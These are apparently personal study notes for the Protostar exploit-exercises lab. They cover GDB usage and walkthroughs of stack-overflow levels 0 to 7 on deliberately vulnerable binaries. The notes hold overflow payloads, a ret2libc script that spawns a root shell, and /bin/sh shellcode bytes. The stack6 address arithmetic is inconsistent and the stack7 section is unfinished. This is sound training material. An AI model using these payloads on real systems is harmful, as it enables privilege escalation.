[Protostar]: https://exploit-exercises.lains.space/protostar/
[Protostar ISO]: https://drive.google.com/drive/folders/0B9RbZkKdRR8qbkJjQ2VXbWNlQzg?usp=sharing
### SSH into VM
> 1. In VM:
>   + If using vmware, make sure `Connect at Power On` is toggeled on in networking section
>   + Make sure VM networking is set to `Host Only`
>   + Start the VM, select `Live`, and login
>    - username: user
>    - password: user
>   + Enter command: `ip a`
>   + Look for ip: `inet ###.###.###.###/24`
>                         ^the # symbols are the ip
> 2. On Host:
>   + $ ssh user@<ip> -p 22
>    - If connection is denied due to a bad RSA key, you may need to delete
>      the last line of `/home/<username>/.ssh/known_hosts` and run the ssh command again
>   + Enter password: user


### Assembly Data Structures
+ WORD  (16 bits/2 bytes) - unsigned short
+ DWORD (32 bits/4 bytes) - unsigned int
+ QWORD (64 bits/8 bytes) - unsigned long
+ PTR   (pointer)         - like c pointer


### Assembly
+ leave
 - mov ebp, esp    # ebp = esp
 - pop EBP
+ CC
 - Used for calling the debug exception handler


### GDB Snippet Playbook
> 1. See assembly in intel syntax
>    `(gdb) set disassembly-flavor intel`
> 
> 2. See assembly instructions of the a function
>    `(gdb) disassemble <function_name>`
>    
> 3. See the memory mappings
>    `(gdb) info proc mappings`
>
> 4. See current instruction
>  + i stands for instruction
>    `(gdb) display/i $pc`
>       or
>    `(gdb) x/i $pc`
>
> 5. Set breakpoint in a specific offset inside fucntion
>    `(gdb) b *(function_name+offset)`
>   
>   Example: `(gdb) b *(main+33)`
>
> 6. Print registers, subset of stack, and upcoming intructions
>    after each step
>   
>    `(gdb) define hook-stop`
>    `> python print '------------------------'`
>    `> info registers`   #prints registers
>    `> python print '------------------------'`
>    `> x/24wx $esp`      #prints stack
>    `> python print '------------------------'`
>    `> x/5i $eip`        #prints instructions
>    `> python print '------------------------'`
>    `> end`
>
> 7. Print Stack Value Formateed
>    + See as Integer (unsigned decimal)
>     - Template  
>        `(gdb) x/u $esp+offset`
>     - Example
>        `(gdb) x/u $esp+0x5c`
>
>    + See as Integer (hexadecimal)
>     - Template  
>        `(gdb) x/x $esp+offset`
>     - Example
>        `(gdb) x/x $esp+0x5c`
>
>    + See as bytes (4 bytes since int is 4 bytes)
>     - Template  
>        `(gdb) x/4b $esp+offset`
>     - Example
>        `(gdb) x/4b $esp+0x5c`
>
>    + See as characters (4 chars since int is 4 bytes)
>     - Template  
>        `(gdb) x/4c $esp+offset`
>     - Example
>        `(gdb) x/4c $esp+0x5c`
>
> 8.  Run gdb with a provided argument:
>    + `python -c "print 'AAAA"" > arg`
>    + `gdb binary`
>    + `(gdb) run < arg`
>
> 9. TUI Mode: https://www.youtube.com/watch?v=PorfLSr3DDI
>    `(gdb) tui reg general`
>    `(gdb) tui reg float`
>
> 10. Using python
>    + `(gdb) python print('A'*76)`
>    + `(gdb) python`
>      `import os`
>      `print('my pid is %d' % os.getpid())`
>

### GDB Command Comparison
> 1. Step vs Next
>   - Step
>      This will go to the next assembly instruction
>      AND will enter into a function
>     `(gdb) s`
>     `(gdb) s [#]`
>               ^optional: number of time to times to step
>   - Next
>      This will go to the next assembly instruction
>      BUT will NOT enter a function and let that function finish
>     `(gdb) n`
>     `(gdb) n [#]`
>               ^optional: number of time to times to step
>
> 2. `break function` VS `break *function`
>   - Break on the first assembly instruction of a function
>      `(gdb) break *function_name`
>   - Break on instruction after function prologue
>      `(gdb) break function_name`


#STACK EXERCISES
[Reference Stack 0-7]: https://kevinalmansa.github.io/write-ups/Protostar-Stack-Write-up/
[Walkthroughs]: https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN


## Stack 0: Overwrite Variable
------------------------------------------------------------------------
[Walkthrough]: https://www.youtube.com/watch?v=T03idxny9jE&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=13&ab_channel=LiveOverflow

[Simple]: python -c "print('A' * 65)" | ./stack0

[Detailed]: Step-by-Step
> 1.  $ cd /opt/protostar/bin
> 
> 2.  $ gdb stack0
>
> 3.  `(gdb) set disassembly-flavor intel`
>
> 4. Print registers, subset of stack, and upcoming intructions
>    after each step
>
>     `(gdb) define hook-stop`
>     `> python print '------------------------'`
>     `> info registers`   #prints registers
>     `> python print '------------------------'`
>     `> x/24wx $esp`      #prints stack
>     `> python print '------------------------'`
>     `> x/5i $eip`        #prints instructions  
>     `> python print '------------------------'`
>     `> end`  
>
> 5.  Set breakpoints
>      Use `(gdb) disassemble main` if you want to see
>       what instruction we are breaking one
>
>    + Break at main:
>      `(gdb) break main`
>
>    + Break after user input:
>      `(gdb) break *(main+33)`
>
>
> 6.  `(gdb) run`
>     You should hit the first breakpoint
>
> 7.  Observe the next 2 instructions
>      <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
>      <main+17>:	lea    eax,[esp+0x1c]
>
> 8.  Observe <main+9>: `mov DWORD PTR [esp+0x5c],0x0`
>    + This is: `modified = 0`
>
>    + `[esp+0x5c]` is the location of the `modified` variable
>
>    + 0x0 is the value assigned to `modified` and is being
>      set in the stack
>
>    + In a decompiler (Ghidra/Cutter)
>     - You'll see that this assembly line points to the line 
>        closest to `modified = 0;`
>     - In Ghidra it's `local_c = 0;`
>
> 9.  Execute next instruction <main+9>: `mov DWORD PTR [esp+0x5c],0x0`
>     `(gdb) step`
>
> 10. Observe `modified` should be 0
>    + See as Integer (unsigned decimal)
>      `(gdb) x/u $esp+0x5c`
>
>    + See as Integer (hexadecimal)
>      `(gdb) x/x $esp+0x5c`
>
>    + See as bytes (4 bytes since int is 4 bytes)
>      `(gdb) x/4b $esp+0x5c`
>
> 11. On a separte terminal, run:
>     `python -c "print('A' * 65)"`
>   
> 12. `(gdb) continue`
>     You should hit the second breakpoint
>
> 13. Copy the output of `step 11`, paste into GDB, and press ENTER
>     Expected Output:
>      you have changed the 'modified' variable
>
> 14. Observe the `modified` variable has been overwritten
>    + `(gdb) x/c $esp+0x5c`
>
>     Output:
>      0xbffffcac:	65 'A'
>
>    + `(gdb) x/4x $esp+0x5c`
>
>     Output:
>      0xbffffcac:	0x41	0x00	0x00	0x00
>
> 
> 15. `(gdb) continue`
>
>     Output:
>      Continuing.
>      you have changed the 'modified' variable



## Stack 1: Overwrite Variable to Specific Value
------------------------------------------------------------------------
[Simple]:  ./stack1 $(python -c "print 'A' * 64 + '\x64\x63\x62\x61'")

Step by step is similar to stack0



## Stack2: Set Enviromental Variable 
------------------------------------------------------------------------
[Simple]:
GREENIE=$(python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'") ./stack2

Step by step is similar to stack0



# Stack3: Jump to another function
------------------------------------------------------------------------
[Walkthrough]: https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
^beginning of video to 3:45

[Simple]: python -c "print('A' * 64 + '\x24\x84\x04\x08')" | ./stack3

[Detailed]: Step-by-Step
> 1.  $ cd /opt/protostar/bin
>
> 2.  $ gdb stack3
>
> 3.  `(gdb) set disassembly-flavor intel`
>
> 4. Print registers, subset of stack, and upcoming intructions
>    after each step
>
>     `(gdb) define hook-stop`
>     `> python print '------------------------'`
>     `> info registers`   #prints registers
>     `> python print '------------------------'`
>     `> x/24wx $esp`      #prints stack
>     `> python print '------------------------'`
>     `> x/5i $eip`        #prints instructions
>     `> python print '------------------------'`
>     `> end`
>
> 5.  Set breakpoints
>      Use `(gdb) disassemble main` if you want to see
>       what instruction we are breaking one
>
>    + Break at main:
>      `(gdb) break main`
>
>    + Break after user input:
>      `(gdb) break *(main+34)`
>
> 6.  `(gdb) run`
>     You should hit the first breakpoint
>
> 7.  Observe the next 2 instructions
>      <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
>      <main+17>:	lea    eax,[esp+0x1c]
>
> 8.  Observe <main+9>: `mov DWORD PTR [esp+0x5c],0x0`
>    + `[esp+0x5c]` is the location of the function pointer `fp`
>
>    + In a decompiler (Ghidra/Cutter), you'll see that this assembly line
>      points to the line closest to `fp = 0;`
>
>     - In Ghidra it's `local_10 = (code *) 0x0;`
>
> 9.  Execute next instruction <main+9>: `mov DWORD PTR [esp+0x5c],0x0`
>     `(gdb) step`
>
> 10. Observe `fp` should be 0
>    + See as Integer (unsigned decimal)
>      `(gdb) x/u $esp+0x5c`
>
>    + See as Integer (hexadecimal)
>      `(gdb) x/x $esp+0x5c`
>
>    + See as bytes (4 bytes since int is 4 bytes)
>      `(gdb) x/4b $esp+0x5c`
>   
> 12. Get address of win function
>     `(gdb) x win`
>
>     Example Output:
>      0x8048424 <win>:	0x83e58955
>     
>     In this example `0x8048424` is the address
>
> 12. `(gdb) quit`
>      Enter y if asked to Quit anyway
>
> 13. `python -c "print('A' * 64 + '\x24\x84\x04\x08')" >  /tmp/arg`
>                                   ^bytes are backward because
>                                    x86 architecture is little endian
> 14.  $ gdb stack3
>
> 15.  `(gdb) set disassembly-flavor intel`
>
> 16. Print registers, subset of stack, and upcoming intructions
>     after each step
>
>     `(gdb) define hook-stop`
>     `> python print '------------------------'`
>     `> info registers`   #prints registers
>     `> python print '------------------------'`
>     `> x/24wx $esp`      #prints stack
>     `> python print '------------------------'`
>     `> x/5i $eip`        #prints instructions
>     `> python print '------------------------'`
>     `> end`
>
> 17.  Set breakpoint after user input:
>      `(gdb) break *(main+29)`
>
> 18.  `(gdb) run < /tmp/arg`
>
> 19.  Should be at instruction: `<main+29>:  cmp  DWORD PTR [esp+0x5c],0x0`
>      `(gdb) x/x $esp+0x5c`
>                  ^this should be equal to the address in step 13
>                   0x08048424 in this example
>
> 20.  `(gdb) continue`
>
>      Expected output:
>       Continuing.
>       calling function pointer, jumping to 0x08048424
>       code flow successfully changed



# Stack4: Controlling the EIP Register
------------------------------------------------------------------------
[Walkthrough]: https://www.youtube.com/watch?v=iyAyN3GFM7A&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
^Start from 3:45

[Simple]: python -c "print('A' * 76 + '\xf4\x83\x04\x08')" | ./stack4

[Detailed]: Step-by-Step
> 1.  $ cd /opt/protostar/bin
>
> 2.  $ gdb stack4
>
> 3.  `(gdb) set disassembly-flavor intel`
>
> 4. Print registers, subset of stack, and upcoming intructions
>    after each step
>
>     `(gdb) define hook-stop`
>     `> python print '------------------------'`
>     `> info registers`   #prints registers
>     `> python print '------------------------'`
>     `> x/24wx $esp`      #prints stack
>     `> python print '------------------------'`
>     `> x/5i $eip`        #prints instructions
>     `> python print '------------------------'`
>     `> end`
>
> 5.  Set breakpoints
>      Use `(gdb) disassemble main` if you want to see
>       what instruction we are breaking one
>
>    + Break at main:
>      `(gdb) break main`
>
>    + Break after user input:
>      `(gdb) break *(main+21)`
>
> 6.  `(gdb) run`
>     You should hit the first breakpoint

> 7.  On a separte terminal, run:
>     `python -c "print('A' * 76 + 'BBBB')"`
>
> 8.  Copy the output of `step 7`, paste into GDB, and press ENTER
>     Expected Output (0x42 is 'B'):
>      Program received signal SIGSEGV, Segmentation fault.
>      0x42424242 in ?? ()
>
> 9.  'BBBB" in step 7 gets stored in the eip register
>
> 10. Get address of win function
>     `(gdb) x win`
>
>     Example Output:
>      0x80483f4 <win>:	0x83e58955
>     
>     In this example `0x80483f4` is the address
>
> 11. `(gdb) quit`
>      Enter y if asked to Quit anyway
>
> 12. `python -c "print('A' * 76 + '\xf4\x83\x04\x08')" > /tmp/arg`
>
> 13. $ gdb stack4
>
> 14.  `(gdb) set disassembly-flavor intel`
>
> 15. Print registers, subset of stack, and upcoming intructions
>     after each step
>
>     `(gdb) define hook-stop`
>     `> python print '------------------------'`
>     `> info registers`   #prints registers
>     `> python print '------------------------'`
>     `> x/24wx $esp`      #prints stack
>     `> python print '------------------------'`
>     `> x/5i $eip`        #prints instructions
>     `> python print '------------------------'`
>     `> end`
>
> 16.  Set breakpoint after user input:
>      `(gdb) break *(main+21)`
>
> 17.  `(gdb) run < /tmp/arg`
>
> 18.  Should be at instruction: `<main+21>:  leave`
>
> 19.  `(gdb) s`
>
> 20.  Observe that you're now in the win function
>      `(gdb) x/i $eip`
>
>      Expected Output:
>       0x80483f4 <win>:	push   ebp




## Stack5: NOP Sled Buffer Overflow
------------------------------------------------------------------------

+ Note that /x90 is the opcode for the NOP (no operation) assembly instruction

[Shellcode]: http://shell-storm.org/shellcode/

[Simple]: $ python -c "print('\x90' * 75 + 'BBBB')" | ./stack5

[Detailed]: Step-by-Step
> 1.  $ cd /opt/protostar/bin
>
> 2.  $ gdb stack5
>
> 3.  `(gdb) set disassembly-flavor intel`
>
> 4. Print registers, subset of stack, and upcoming intructions
>    after each step
>
>     `(gdb) define hook-stop`
>     `> python print '------------------------'`
>     `> info registers`   #prints registers
>     `> python print '------------------------'`
>     `> x/24wx $esp`      #prints stack
>     `> python print '------------------------'`
>     `> x/5i $eip`        #prints instructions
>     `> python print '------------------------'`
>     `> end`
>
> 5.  Set breakpoint
>      Use `(gdb) disassemble main` if you want to see
>       what instruction we are breaking one
>
>    + break after user input:
>      `(gdb) break *(main+21)`
>
> 6.  `(gdb) run`
>     You should hit the first breakpoint
>
> 7.  On a separte terminal, run:
>     `python -c "print('A' * 72 + 'BCDE')"`
>
> 8.  Copy the output of `step 7`, paste into GDB, and press ENTER
>
> 9.  See the bytes of input:
>     (gdb) x/94b $esp
>
> 10. (gdb) step
>
>     Expected Output:
>      Cannot access memory at address 0x42424246
>
> 11. See the $ebp register and observe BCDE(42 43 44 45):
>     (gdb) info registers $ebp
>
>     Expected Output:
>      ebp    0x45444342	0x45444342
>                             ^EDCB since little endian
>
> 12. Print and remember the address $esp points to
>     (gdb) info registers $esp
>
>     Example Output:
>      esp    0xbffffcc0	0xbffffcc0
>
> 13. `(gdb) quit`
>      Enter y if asked to Quit anyway
>
> 14. $ `python -c "print('A' * 72 + '\xc0\xfc\xff\xbf' + '\xCC'*4)" > /tmp/arg`
>                                                          ^This is an Interrupt
>                                                           for INTEL CPUs!!!!!!
>
> 15. $ gdb stack5
>
> 16. `(gdb) set disassembly-flavor intel`
>
> 17. Print registers, subset of stack, and upcoming intructions
>     after each step
>
>     `(gdb) define hook-stop`
>     `> python print '------------------------'`
>     `> info registers`   #prints registers
>     `> python print '------------------------'`
>     `> x/24wx $esp`      #prints stack
>     `> python print '------------------------'`
>     `> x/5i $eip`        #prints instructions
>     `> python print '------------------------'`
>     `> end`
>
> 18. Break after user input:
>     `(gdb) break *(main+22)`
>
> 19. `(gdb) r < /tmp/arg`
>
> 20. See your input in the stack
>     `(gdb) x/x $esp`
>
>     You should see `0xcccccccc`
>
> 21. `(gdb) continue`
>
>     Expected Output:
>      Program received signal SIGTRAP, Trace/breakpoint trap.



## Stack6: ret2libc
------------------------------------------------------------------------
[Walkthrough]: https://www.youtube.com/watch?v=Y1RRda2Wnpw
[Walkthrough]: https://www.youtube.com/watch?v=m17mV24TgwY

> 1.  $ cd /opt/protostar/bin
>
> 2.  $ gdb stack6
>
> 3.  `(gdb) set disassembly-flavor intel`
>
> 4. Print registers, subset of stack, and upcoming intructions
>    after each step
>
>     `(gdb) define hook-stop`
>     `> python print '------------------------'`
>     `> info registers`   #prints registers
>     `> python print '------------------------'`
>     `> x/24wx $esp`      #prints stack
>     `> python print '------------------------'`
>     `> x/5i $eip`        #prints instructions
>     `> python print '------------------------'`
>     `> end`
>
> 5. Break after user input in the gets method in getpath:
>     `(gdb) break *(getpath+43)`
>
> 6. Break at the end of getpath method:
>     `(gdb) break *(getpath+116)`
>
> 7. On a separte terminal run: `python -c "print 'A'*64"`
>
> 8. `(gdb) r`
>
> 9. Enter the 'A's from step 7 when asked for input
>
> 10. You should have hit your breakpoint
>
> 11. Get address to system (`__libc_system`):
>     `(gdb) p system`
>
>     Output:
>     `$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>`
>
> 12. To see a gernal memory mapping in this process:
>     `(gdb) info proc map`
>
>     Target Output:    
>     `0xb7e97000 0xb7fd5000   0x13e000     0    /lib/libc-2.11.2.so`   
>     0xb7e97000 is the start address of libc   
>
> 13. On a separate terminal, get address to /bin/sh:     
>     `strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"`   
>      
>     Output:   
>     `11f3bf /bin/sh`   
> 
> 14. /bin/sh full address =  0xb7fd7000 + 11f3bf = 0x67fb63bf     
>     `(gdb) x/s 0xb7fd7000 + 11f3bf`
>
> 15. Make a python file in the tmp directory: `vi /tmp/stack6.py`
>
>     Code:
```
import struct

padding = 'A'* 80
system = struct.pack("I", 0xb7ecffb0)
nop = "\x90" * 4
bin_sh = struct.pack("I", 0xb7fb63bf)

print (padding + system + nop + bin_sh)
```
>
> 16. `python /tmp/stack6.py > /tmp/txt`
>
> 17. `cat /tmp/txt - | ./stack6`
>
> 18. Check if you are now root instead of user: `whoami`

*******

## Stack7: rop
------------------------------------------------------------------------
[Walkthrough]: https://www.youtube.com/watch?v=IncswlWGn1M

> 1.  $ cd /tmp       
>
> 2.  $ objdump -d /opt/protostar/bin/stack7 > /tmp/objdumpstack7
>
> 3.  Observe objdump for pop and return. Such as:    
```
 8048492:	5b                   	pop    %ebx    
 8048493:	5d                   	pop    %ebp    
 8048494:	c3                   	ret    
```
> 4. Get shell code `http://shell-storm.org/shellcode/files/shellcode-811.php` and store it into environmental variable
```
SHELLCODE=`python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
```
> 5. Make this c file in /tmp: `vim /tmp/env.c`    
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main (int argc, char *argv[])
{
    char *ptr;

    ptr = getenv(argv[1]); //get env var location
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; // adjust for program name
    printf("%s address: %p\n", argv[1], ptr);
}
```
> 6. Compile env.c: `gcc /tmp/env.c -o /tmp/env`
> 
> 7. /tmp/env SHELLCODE /opt/protostar/bin/stack7
>
> 8. Execute it: `/tmp/env SHELLCODE /opt/protostar/bin/stack7`
>    example output: `SHELLCODE address: 0xffffffde` 0xffffffdd






> 2.  $ gdb stack7    
>
> 3.  `(gdb) set disassembly-flavor intel`    
>
> 4. Print registers, subset of stack, and upcoming intructions    
>    after each step   
>    
>     `(gdb) define hook-stop`    
>     `> python print '------------------------'`    
>     `> info registers`   #prints registers    
>     `> python print '------------------------'`   
>     `> x/24wx $esp`      #prints stack   
>     `> python print '------------------------'`   
>     `> x/5i $eip`        #prints instructions    
>     `> python print '------------------------'`  
>     `> end`    
>
> 5. `(gdb) break *(getpath+128)
>
>
